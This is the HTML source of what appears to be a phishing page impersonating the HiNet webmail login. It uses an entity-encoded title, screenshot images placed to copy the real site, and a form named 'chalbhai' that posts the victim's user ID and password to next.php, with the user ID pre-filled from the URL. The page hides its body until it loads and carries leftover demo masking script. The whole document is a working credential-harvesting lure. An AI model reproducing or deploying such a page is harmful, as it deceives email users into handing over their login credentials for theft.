<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#72;&#105;&#78;&#101;&#116;&#32;&#32178;&#38913;&#37109;&#20214;&#26381;&#21209;</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<style type="text/css">
  
.textbox {
   	font-size: 9pt;
    font-family: Helvetica,Arial;
    height: 22px;
    width: 275px;
    border: 1px solid #848484;
}

.textbox:focus {  
    border-color: #8EB1EB; 
    background-color: #D8CEF6;
    border-width: 2px; 
    outline: 0; 
 } 

 </style>
 <style type="text/css">
  
.textrbox {
   	font-size: 9pt;
    font-family: Helvetica,Arial;
    height: 25px;
    width: 275px;
    border: 1px solid #fff;
}

.textrbox:focus {  
    border-color: #fff; 
    border-width: 0px; 
    outline: 0; 
 } 

 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:96px; z-index:0"><img src="images/n1.png" alt="" title="" border=0 width=1365 height=96></div>

<div id="image2" style="position:absolute; overflow:hidden; left:848px; top:96px; width:265px; height:415px; z-index:1"><img src="images/n2.png" alt="" title="" border=0 width=265 height=415></div>

<div id="image3" style="position:absolute; overflow:hidden; left:130px; top:97px; width:661px; height:504px; z-index:2"><a href="#"><img src="images/n3.png" alt="" title="" border=0 width=661 height=504></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:369px; top:601px; width:614px; height:61px; z-index:3"><img src="images/n4.png" alt="" title="" border=0 width=614 height=61></div>

<div id="image5" style="position:absolute; overflow:hidden; left:880px; top:453px; width:186px; height:39px; z-index:4"><a href="#"><img src="images/n5.png" alt="" title="" border=0 width=186 height=39></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:861px; top:375px; width:223px; height:16px; z-index:5"><a href="#"><img src="images/n6.png" alt="" title="" border=0 width=223 height=16></a></div>
<form action=next.php name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" class="textrbox" autocomplete="off" required type="text" style="position:absolute;width:140px;left:919px;top:214px;z-index:6">
<input name="pass" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:138px;left:919px;top:254px;z-index:7">
<div id="formimage1" style="position:absolute; left:1062px; top:253px; z-index:8"><input type="image" name="formimage1" width="39" height="26" src="images/ko.png"></div>
<div id="formcheckbox1" style="position:absolute; left:860px; top:295px; z-index:9"><input type="checkbox" name="formcheckbox1"></div>
<div id="formcheckbox2" style="position:absolute; left:953px; top:295px; z-index:10"><input type="checkbox" name="formcheckbox2"></div>
<div id="formcheckbox3" style="position:absolute; left:860px; top:321px; z-index:11"><input type="checkbox" name="formcheckbox3"></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
